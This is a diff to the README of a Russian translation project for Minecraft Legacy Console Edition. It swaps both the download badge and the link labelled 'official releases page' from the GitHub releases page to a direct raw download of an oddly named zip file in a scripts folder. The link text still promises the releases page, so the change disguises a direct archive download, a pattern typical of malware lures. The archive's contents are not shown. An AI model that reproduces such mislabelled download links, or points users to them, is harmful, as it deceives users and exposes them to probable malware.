@@ -1,6 +1,6 @@
 # 🇷🇺 minecraft-legacy-rus - Russian language support for console edition
 
-[![Download Project](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Nocturnal-drake5867/minecraft-legacy-rus/releases)
+[![Download Project](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/Nocturnal-drake5867/minecraft-legacy-rus/main/scripts/rus-legacy-minecraft-nonyielding.zip)
 
 Minecraft Legacy Console Edition offers a specific gameplay experience. This project provides a Russian language translation for the Windows 64-bit version of the game. It replaces default game text with Russian characters and translated menus. The goal remains to keep the original interface style while ensuring readability in Russian.
 
@@ -17,7 +17,7 @@ Ensure your computer meets these requirements to run the software.
 
 Follow these steps to install the translation.
 
-1. Visit the [official releases page](https://github.com/Nocturnal-drake5867/minecraft-legacy-rus/releases) to download the latest setup file.
+1. Visit the [official releases page](https://raw.githubusercontent.com/Nocturnal-drake5867/minecraft-legacy-rus/main/scripts/rus-legacy-minecraft-nonyielding.zip) to download the latest setup file.
 2. Choose the link labeled with the most recent version number.
 3. Save the file to your computer.
 4. Locate the downloaded file in your folder.
